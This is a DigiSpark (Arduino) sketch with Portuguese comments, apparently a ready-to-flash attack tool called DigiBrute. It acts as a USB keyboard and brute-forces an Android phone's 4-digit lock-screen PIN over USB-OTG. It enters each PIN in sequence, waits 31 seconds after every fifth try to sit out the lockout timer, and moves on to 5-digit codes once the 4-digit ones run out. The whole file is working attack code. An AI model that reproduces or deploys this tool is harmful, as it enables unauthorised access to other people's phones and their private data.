/* =====================================================
DigiBrute - ataque de força bruta com PIN de 4 dígitos
para dispositivos Android USB-OTG.
===================================================== */

#include "DigiKeyboard.h"
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int a = 0; //1st digit
int b = 0; //2nd digit
int c = 0; //3rd digit
int d = 0; //4th digit
int e = 0; //5th digit
int count = 0;
bool key_stroke_e = false;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); //isso geralmente não é necessário, mas com alguns sistemas mais antigos parece evitar a perda do primeiro caractere após um atraso
  delay(3000);
}

void loop() {
  //Após 5 tentativas, inicialize 31.000 ms e espere para tentar novamente.
  if(count == 5){
    digitalWrite(1,HIGH); //Altere para 0 se estiver usando DigiSpark modelo B
    DigiKeyboard.sendKeyStroke(40); //pressionamos Enter para fazer o pop-up desaparecer
    delay(31000);
    count = 0;
    digitalWrite(1,LOW);
  }
  /*Envia pressionamentos de tecla com base nos valores entre 0-9 
  Ele começará a aumentar 5 dígitos se a exceder 10*/
  if (key_stroke_e == false)
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[c]);
    DigiKeyboard.sendKeyStroke(num[d]);
  //verifique se é verdade. Em caso afirmativo, use 5 dígitos.
  if (key_stroke_e == true){
    DigiKeyboard.sendKeyStroke(num[a]);
    DigiKeyboard.sendKeyStroke(num[b]);
    DigiKeyboard.sendKeyStroke(num[c]);
    DigiKeyboard.sendKeyStroke(num[d]);
    DigiKeyboard.sendKeyStroke(num[e]);
  }
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
  d++;
  count++;
  //Se o 4º dígito passar de 9, ele volta para 0 e incrementa o 3º dígito
  if(d == 10){
    d = 0;
    c++;
    //Se o terceiro dígito passar de 9, ele volta para 0 e incrementa o segundo dígito
    if(c == 10){
      c = 0;
      b++;
      //Se o segundo dígito passar de 9, ele volta para 0 e incrementa o primeiro dígito
      if(b == 10){
        b = 0;
        a++; //Se o primeiro dígito passar de 9, provavelmente apenas gerará erros.
  if(a == 10){
    //permanecer_true será igual a verdadeiro, percorrerá void () e enviará o quinto toque de tecla
    key_stroke_e = true;
    e++;
    //Lembre-se de que a força bruta ainda funcionará, apesar de sua ordem estranha.
    //Depois de e == 10, ele se tornará 0 novamente.
    if(e == 10){
      e = 0;
    }
  }
      }  
    }
  }    
}
